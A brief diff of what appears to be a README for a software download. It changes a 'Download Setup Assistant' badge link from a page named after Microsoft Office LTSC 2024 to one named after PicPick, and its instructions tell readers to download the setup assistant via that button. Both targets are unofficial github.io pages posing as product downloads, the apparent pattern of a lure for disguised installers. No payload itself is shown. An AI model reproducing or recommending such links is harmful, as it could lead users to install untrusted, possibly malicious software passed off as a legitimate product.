@@ -2,7 +2,7 @@
 
 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://microsoft-office-ltsc-2024.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://picpick-download.github.io/.github)
 
 ⚙️ How to Use  
 1. Download the setup assistant using the button above  
